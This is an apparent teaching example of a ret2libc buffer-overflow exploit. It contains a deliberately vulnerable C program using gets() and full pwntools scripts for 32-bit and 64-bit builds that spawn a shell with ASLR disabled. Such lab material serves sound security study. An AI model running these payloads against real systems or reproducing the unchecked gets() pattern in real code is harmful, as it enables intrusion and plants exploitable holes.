# Example: ret2libc Exploit Without ASLR
## Vulnerable Source Code
````c
#include <stdio.h>

void vuln() {
    char buffer[64];

    puts("Overflow me");
    gets(buffer);
}

int main() {
    vuln();
}
````

## Explanation
This program is vulnerable to a buffer overflow because the gets function does not perform bounds checking on user input. This allows an attacker to:

Overwrite the return address on the stack.
Redirect execution to the system function in the libc library to execute arbitrary commands, such as spawning a shell.
Since Address Space Layout Randomization (ASLR) is disabled, the memory addresses of libc functions remain static, making it easier to exploit the vulnerability.

### 32-Bit Exploit
This exploit targets the 32-bit version of the vulnerable program.

````python

# 32-bit Exploit for ret2libc
from pwn import *

elf = context.binary = ELF('./vuln-32')  # Load the binary
p = process()                            # Start the vulnerable program

libc = elf.libc                          # Retrieve the libc linked to the program
libc.address = 0xf7dc2000                # Base address of libc (static due to no ASLR)

system = libc.sym['system']              # Address of the 'system' function
binsh = next(libc.search(b'/bin/sh'))    # Address of the "/bin/sh" string

# Construct the payload
payload = b'A' * 76                      # Padding to overflow the buffer and reach the return address
payload += p32(system)                   # Overwrite return address with the address of 'system'
payload += p32(0x0)                      # Fake return address (not important once we get the shell)
payload += p32(binsh)                    # Argument to 'system': pointer to "/bin/sh"

p.clean()                                # Clean any pending output
p.sendline(payload)                      # Send the exploit payload
p.interactive()    
````
                      # Interact with the spawned shell
### Key Points
- Padding: The buffer is 64 bytes, but an additional 12 bytes (4 bytes for saved EBP + 8 bytes for alignment) are required to reach the return address.
- Static Addressing: ASLR is disabled, so the base address of libc (0xf7dc2000) is known.

### 64-Bit Exploit
This exploit targets the 64-bit version of the vulnerable program.

```python
# 64-bit Exploit for ret2libc
from pwn import *

p = process('./vuln-64')                # Start the vulnerable program

libc_base = 0x7ffff7de5000              # Base address of libc (static due to no ASLR)
system = libc_base + 0x48e20            # Offset of 'system' function from libc base
binsh = libc_base + 0x18a143            # Offset of "/bin/sh" string from libc base

POP_RDI = 0x4011cb                      # Address of 'pop rdi; ret' gadget in the binary

# Construct the payload
payload = b'A' * 72                     # Padding to overflow the buffer and reach the return address
payload += p64(POP_RDI)                 # Gadget to set up the 'rdi' register with the address of "/bin/sh"
payload += p64(binsh)                   # Address of "/bin/sh"
payload += p64(system)                  # Address of the 'system' function
payload += p64(0x0)                     # Fake return address (not important once we get the shell)

p.clean()                               # Clean any pending output
p.sendline(payload)                     # Send the exploit payload
p.interactive()   
```      
# Interact with the spawned shell
Key Points
- Padding: The buffer is 64 bytes, but an additional 8 bytes for saved RBP are required to reach the return address.
- Gadget: A pop `rdi;` ret gadget is used to load the address of `/bin/sh` into the rdi register, which is the first argument for system on x86-64 systems.